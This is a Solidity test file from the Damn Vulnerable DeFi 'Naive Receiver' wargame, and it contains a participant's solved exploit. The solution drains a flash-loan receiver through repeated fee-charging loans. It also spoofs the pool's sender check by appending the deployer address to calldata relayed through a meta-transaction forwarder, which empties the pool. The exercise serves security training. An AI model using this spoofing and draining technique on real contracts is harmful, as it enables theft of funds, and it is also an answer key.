// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";

contract NaiveReceiverChallenge is Test {
    address deployer = makeAddr("deployer");
    address recovery = makeAddr("recovery");
    address player;
    uint256 playerPk;

    uint256 constant WETH_IN_POOL = 1000e18;
    uint256 constant WETH_IN_RECEIVER = 10e18;

    NaiveReceiverPool pool;
    WETH weth;
    FlashLoanReceiver receiver;
    BasicForwarder forwarder;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        (player, playerPk) = makeAddrAndKey("player");
        startHoax(deployer);

        // Deploy WETH
        weth = new WETH();

        // Deploy forwarder
        forwarder = new BasicForwarder();

        // Deploy pool and fund with ETH
        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);

        // Deploy flashloan receiver contract and fund it with some initial WETH
        receiver = new FlashLoanReceiver(address(pool));
        weth.deposit{value: WETH_IN_RECEIVER}();
        weth.transfer(address(receiver), WETH_IN_RECEIVER);

        vm.stopPrank();
    }

    function test_assertInitialState() public {
        // Check initial balances
        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);

        // Check pool config
        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
        assertEq(pool.flashFee(address(weth), 0), 1 ether);
        assertEq(pool.feeReceiver(), deployer);

        // Cannot call receiver
        vm.expectRevert(bytes4(hex"48f5c3ed"));
        receiver.onFlashLoan(
            deployer,
            address(weth), // token
            WETH_IN_RECEIVER, // amount
            1 ether, // fee
            bytes("") // data
        );
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_naiveReceiver() public checkSolvedByPlayer {
        // total amount needed to pass challenge
        uint256 amountToWithdraw = pool.deposits(deployer) + weth.balanceOf(address(receiver));
        // build multicall data array to drain reciever and pool
        bytes[] memory multicallData = new bytes[](11);
        // drain the receiver contract by taking out 10 flash loans of no value which will approve and send their entire balance (10 weth) to the pool contract as fee payments
        for (uint256 i = 0; i < 10; i++) {
            multicallData[i] = abi.encodeWithSelector(pool.flashLoan.selector, receiver, address(weth), 0, "");
        }

        // this simple approach did not work
        // pool.deposits(address(pool)) = 0 here so calling withdraw wont work, even though that would be easiest
        // uint256 amount = weth.balanceOf(address(pool));
        // multicallData[10] = abi.encodeWithSelector(pool.withdraw.selector, amount, recovery);
        // pool.multicall(multicallData);

        // Calling multicall directly doesnt seem to be the solution since we need the withdraw call to go through the fowarder and we need to keep total txs down to pass challenge
        // to get arround this I can encode the multicall itself into a request and send that with 10 flashloans and the withdraw all in one request
        // Need to go through the fowarder since the NativeReceiverPool::_msgSender can be tricked if the call comes from the fowarder
        // encode withdraw function call with deployer address at the end to trick NativeReceiverPool::_msgSender into thinking deployer is calling withdraw
        multicallData[10] =
            abi.encodePacked(abi.encodeWithSelector(pool.withdraw.selector, amountToWithdraw, recovery), deployer);
        bytes memory data = abi.encodeWithSelector(pool.multicall.selector, multicallData);

        BasicForwarder.Request memory request = BasicForwarder.Request({
            from: player,
            target: address(pool),
            value: 0,
            gas: gasleft(),
            nonce: forwarder.nonces(player),
            data: data,
            deadline: block.timestamp + 1 weeks
        });
        bytes32 requestHash = forwarder.getDataHash(request);
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", forwarder.domainSeparator(), requestHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(playerPk, digest);
        bytes memory signature = abi.encodePacked(r, s, v);

        forwarder.execute(request, signature);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player must have executed two or less transactions
        assertLe(vm.getNonce(player), 2);

        // The flashloan receiver contract has been emptied
        assertEq(weth.balanceOf(address(receiver)), 0, "Unexpected balance in receiver contract");

        // Pool is empty too
        assertEq(weth.balanceOf(address(pool)), 0, "Unexpected balance in pool");

        // All funds sent to recovery account
        assertEq(weth.balanceOf(recovery), WETH_IN_POOL + WETH_IN_RECEIVER, "Not enough WETH in recovery account");
    }
}
